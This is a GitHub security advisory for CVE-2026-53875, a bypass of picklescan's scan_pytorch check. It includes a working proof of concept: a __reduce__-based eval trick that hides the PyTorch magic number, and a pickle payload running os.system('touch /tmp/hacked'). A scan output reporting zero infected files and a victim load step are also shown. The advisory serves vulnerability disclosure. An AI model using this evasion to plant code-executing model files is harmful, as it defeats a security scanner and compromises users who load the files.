# [H] Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER

## Summary
Severity: High
Advisory: GHSA-97f8-7cmv-76j2
CVE: CVE-2026-53875
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-97f8-7cmv-76j2
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <1.0.3

## Details
### Summary
This is a scanning bypass to `scan_pytorch` function in `picklescan`. As we can see in the implementation of [get_magic_number()](https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/torch.py#L76C5-L84) that uses `pickletools.genops(data)` to get the `magic_number` with the condition `opcode.name` includes `INT` or `LONG`, but the PyTorch's implemtation simply uses [pickle_module.load()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1797) to get this `magic_number`. For this implementation difference, we then can embed the `magic_code` into the `PyTorch` file via dynamic `eval` on the `\_\_reduce\_\_` trick, which can make the `pickletools.genops(data)` cannot get the `magic_code` in `INT` or `LONG` type, but the `pickle_module.load()` can still return the same `magic_code`, eading to a bypass.

### PoC
#### Attack Step 1
we can edit the source code of the function [\_legacy\_save()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1120) as follows:
```Python
    class payload:
        def __reduce__(self):
            return (eval, ('MAGIC_NUMBER',))

    pickle_module.dump(payload(), f, protocol=pickle_protocol)
```
#### Attack Step 2
with the modified version of `PyTorch`, we run the following PoC to generate the `payload.pt`:
```Python
import torch 

class payload:
    def __reduce__(self):
        return (__import__('os').system, ('touch /tmp/hacked',))

torch.save(payload(), './payload.pt', _use_new_zipfile_serialization = False)
```

#### Picklescan result
```
ERROR: Invalid magic number for file /home/pzhou/bug-bunty/pytorch/PoC/payload.pt: None != 119547037146038801333356
----------- SCAN SUMMARY -----------
Scanned files: 0
Infected files: 0
Dangerous globals: 0
```

#### Victim Step
```Python
import torch
torch.load('./payload.pt', weights_only=False)
```
then you can find the illegal file `/tmp/hacked` created in your local system.

### Impact
Craft malicious `PyTorch` payloads to bypass `picklescan`, then recall ACE/RCE.

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2
- https://nvd.nist.gov/vuln/detail/CVE-2026-53875
- https://github.com/mmaitre314/picklescan/commit/134179474539648ba7dee1317959529fbd0e7f89
- https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f
- https://github.com/mmaitre314/picklescan/commit/b9997634683a4f4bd0c7e3701e7ce7e90fe70e8c
- https://github.com/mmaitre314/picklescan
- https://www.vulncheck.com/advisories/picklescan-scanning-bypass-via-dynamic-eval-in-scan-pytorch
